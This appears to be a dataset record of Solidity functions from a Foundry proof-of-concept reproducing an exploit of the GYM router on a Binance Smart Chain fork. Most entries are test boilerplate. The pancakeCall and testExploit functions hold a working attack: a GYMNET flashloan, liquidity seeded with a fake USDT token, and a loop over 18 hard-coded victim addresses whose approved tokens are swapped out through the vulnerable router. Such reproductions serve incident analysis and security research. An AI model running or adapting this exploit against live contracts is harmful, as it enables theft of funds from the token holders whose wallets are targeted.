[
  {
    "contract/interface": "IGymRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        GYMNET.approve(address(PancakeRouter), ~uint256(0));\n        fakeUSDT.approve(address(PancakeRouter), ~uint256(0));\n        CakeLP.approve(address(PancakeRouter), ~uint256(0));\n\n        console.log(\"2. Adding GYMNET-fakeUSDT liquidity\");\n        PancakeRouter.addLiquidity(\n            address(GYMNET),\n            address(fakeUSDT),\n            GYMNET.balanceOf(address(this)),\n            fakeUSDT.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp + 1000\n        );\n\n        emit log_named_decimal_uint(\n            \"2a. Added attacker's liquidity\", CakeLP.balanceOf(address(this)), CakeLP.decimals()\n        );\n\n        address[] memory victims = new address[](18);\n        victims[0] = 0x0C8bbd0629050b78C91F1AAfDCF04e90238B3568;\n        victims[1] = 0xbDFcA747646975F3bb9dA26BD55DAf2168c40Fe7;\n        victims[2] = 0x4AD478039bE7D1aD17C2eCBEb1029c29366c2789;\n        victims[3] = 0x081c96340738e397111E010137E04E97fB444E74;\n        victims[4] = 0xb611329241a51F84519BDc773E5E98F94e2D7491;\n        victims[5] = 0x3720d2BbFC8Bd5d6D62c8bf71fFD33Ea20cbEAE5;\n        victims[6] = 0x07E12a333B500a2f7048131400f0D216eb226F10;\n        victims[7] = 0xe01edc2B47576bf4aEF9fa311B1f16961c634F76;\n        victims[8] = 0x96346D0302E8640fbB165040B3d039bf10ce9565;\n        victims[9] = 0x88c08aafFDd547EBa783c84c23b549B5222fFB56;\n        victims[10] = 0x38B9a3Bd8693D59d38769A7CE8802632D1DB9D67;\n        victims[11] = 0x0E1556F63B7d30D6d7966Cb7b194eA7A8F3C588a;\n        victims[12] = 0x7E1d08f4960b3825eb3da2abbE3Cc849Ff53576c;\n        victims[13] = 0xA4265EfFEeeeC7dbc5b323610ccD738E8A1aE298;\n        victims[14] = 0xE62551B1385FD59C6A39224838Ba432B0F7735f2;\n        victims[15] = 0xE52234Ed813EBFC625477B4626AB84Ea09A82556;\n        victims[16] = 0x819B684fd18D0512EFC89c81aEAadFDdA61Fa7fC;\n        victims[17] = 0xd6c382B2624293cEf5A43E30e12cc0e6b3DEd153;\n\n        console.log(\"3. Exploiting vulnerability in gym router...\");\n        for (uint256 i; i < victims.length; ++i) {\n            GYMNETTofakeUSDT(victims[i]);\n        }\n\n        emit log_named_decimal_uint(\n            \"4. Removing GYMNET-fakeUSDT liquidity\", CakeLP.balanceOf(address(this)), CakeLP.decimals()\n        );\n        PancakeRouter.removeLiquidity(\n            address(GYMNET),\n            address(fakeUSDT),\n            CakeLP.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp + 1000\n        );\n\n        console.log(\"5. Repaying GYMNET flashloan\");\n        GYMNET.transfer(address(PancakePair), 1_043_936 * 1e18);\n\n        // emit log_named_decimal_uint(\n        //     \"Attacker fakeUSDT balance after exploit\",\n        //     fakeUSDT.balanceOf(address(this)),\n        //     fakeUSDT.decimals()\n        // );\n        emit log_named_decimal_uint(\n            \"Attacker GYMNET balance after exploit\", GYMNET.balanceOf(address(this)), GYMNET.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 30_448_986);\n        cheats.label(address(GYMNET), \"GYMNET\");\n        cheats.label(address(fakeUSDT), \"fakeUSDT\");\n        cheats.label(address(CakeLP), \"CakeLP\");\n        cheats.label(address(PancakePair), \"PancakePair\");\n        cheats.label(address(PancakeRouter), \"PancakeRouter\");\n        cheats.label(address(GymRouter), \"GymRouter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GYMTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Attacker deploys fakeUSDT contract\uff0cforcing victim's gym to exchange fakeUSDT to earn\n        // Start with below amount of fakeUSDT. Crucial for further adding liquidity to PancakeRouter\n        // Attack contract already had fakeUSDT balance in attack tx\n        deal(address(fakeUSDT), address(this), 9_990_000 * 1e18);\n        // emit log_named_decimal_uint(\n        //     \"Attacker fakeUSDT balance before exploit\",\n        //     fakeUSDT.balanceOf(address(this)),\n        //     fakeUSDT.decimals()\n        // );\n        emit log_named_decimal_uint(\n            \"Attacker GYMNET balance before exploit\", GYMNET.balanceOf(address(this)), GYMNET.decimals()\n        );\n        console.log(\"1. Taking GYMNET flashloan\");\n        PancakePair.swap(1_010_000 * 1e18, 0, address(this), new bytes(1));\n    }\n\n",
    "description": ""
  }
]